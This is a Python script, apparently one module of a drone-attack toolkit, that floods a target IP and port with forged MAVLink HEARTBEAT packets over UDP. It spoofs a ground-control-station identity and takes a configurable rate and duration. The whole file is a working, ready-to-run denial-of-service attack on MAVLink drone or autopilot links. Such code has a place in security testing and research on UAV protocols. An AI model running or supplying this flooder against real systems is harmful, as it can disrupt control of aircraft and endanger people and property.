#!/usr/bin/env python3
"""
DoS Flooding Attack Module

Floods system with rapid message bursts.
"""
import time
import sys
import socket
from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mavlink2

def attack_dos_flooding(sock, mav, target_ip, target_port, duration_sec: int = 5, rate_hz: int = 100):
    """
    Flood system with messages
    
    Args:
        sock: UDP socket
        mav: MAVLink packer
        target_ip: Target IP address
        target_port: Target port
        duration_sec: Duration of attack (seconds)
        rate_hz: Messages per second
    """
    print(f"[DOS FLOOD] Starting DoS attack...")
    print(f"[DOS FLOOD] Duration: {duration_sec}s, Rate: {rate_hz} msg/s")
    
    start_time = time.time()
    msg_count = 0
    
    try:
        while (time.time() - start_time) < duration_sec:
            msg = mav.heartbeat_encode(
                type=mavutil.mavlink.MAV_TYPE_GCS,
                autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                base_mode=0,
                custom_mode=0,
                system_status=mavutil.mavlink.MAV_STATE_ACTIVE
            )
            packet = msg.pack(mav)
            sock.sendto(packet, (target_ip, target_port))
            
            msg_count += 1
            time.sleep(1.0 / rate_hz)
            
            if msg_count % 100 == 0:
                elapsed = time.time() - start_time
                actual_rate = msg_count / elapsed
                print(f"[DOS FLOOD] {msg_count} messages sent ({actual_rate:.1f} msg/s)")
                print(f"[ATTACKER] Sent HEARTBEAT #{msg_count} to {target_ip}:{target_port} ({len(packet)} bytes)")
        
        elapsed = time.time() - start_time
        actual_rate = msg_count / elapsed
        print(f"[DOS FLOOD] Attack complete! {msg_count} messages in {elapsed:.1f}s ({actual_rate:.1f} msg/s)")
        
    except KeyboardInterrupt:
        print("[DOS FLOOD] Attack interrupted by user")
    except Exception as e:
        print(f"[DOS FLOOD] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python dos_flood.py <target_ip> <target_port> [duration] [rate]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    rate = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    
    # Create raw UDP socket (reliable on Windows)
    print(f"[ATTACKER] Creating UDP socket for: {target_ip}:{target_port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Create MAVLink packer (NO network binding - pure encoder)
    mav = mavlink2.MAVLink(None)
    mav.srcSystem = 255  # Attacker system ID
    mav.srcComponent = 190  # Attacker component ID
    
    time.sleep(1)
    attack_dos_flooding(sock, mav, target_ip, target_port, duration, rate)
